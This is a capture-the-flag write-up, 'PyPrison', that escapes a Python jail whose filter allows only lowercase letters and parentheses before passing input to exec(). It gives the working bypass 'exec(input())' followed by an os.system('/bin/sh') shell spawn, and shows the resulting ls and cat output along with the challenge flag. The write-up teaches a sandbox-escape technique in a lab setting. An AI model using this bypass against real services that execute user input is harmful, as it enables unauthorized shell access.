# PyPrison - The Writeup
By: DJ Snowball#9853
## The Problem
In this problem, we are given two things. A file, main.py, and a server to connect to with netcat.

Connecting to the server, we are able to execute python with some restrictions. Our goal is to break out of this "prison" and get the flag.

## Understanding the Prison
The contents of main.py are as follows:
```py
while True:
  a = input(">>> ")
  assert all(n in "()abcdefghijklmnopqrstuvwxyz" for n in a)
  exec(a)
```

Breaking this down, we can understand the following:
1) The program is in an infinite loop
2) Each iteration of the loop, the program is...

    2a) Taking in some input

    2b) Checking if that input is a lowercase letter or parentheses, throwing an AssertionError if not

    2c) Running our input

## Getting A Shell
In python, an easy way to get a shell is as follows:
```py
import os
os.system("/bin/sh")
```

However, in our scenario, running this will not work.
For starters, our first line will throw an AssertionError due to it having a space.
Our second line, which has quotation marks and a forward slash won't fly either.

We need to find a way to run our code without directly typing it into the program.

## The Solution
The `exec` function is used by the program to run our code. What if we used that exec function ourselves?

The simplest form of the exec function takes in a string of code to run. Now, to input our code without raising an AssertionError, we can simply use the input() function.

Then, when we type in our input, we can type in whatever we want.

```py
>>> exec(input())
import os;os.system("/bin/sh")
```

The only input that the program got was `exec(input())`. After that, it ran the code, allowing us to type in whatever code we want. Now, we have a full shell.

```py
>>> exec(input())
import os;os.system("/bin/sh")
ls
chal
flag.txt

cat flag.txt
ictf{pyprison_more_like_python_as_a_service_12b19a09}
```

Running ls, we see that the file flag.txt exists. Looking at its file contents, we get our flag: ictf{pyprison_more_like_python_as_a_service_12b19a09}
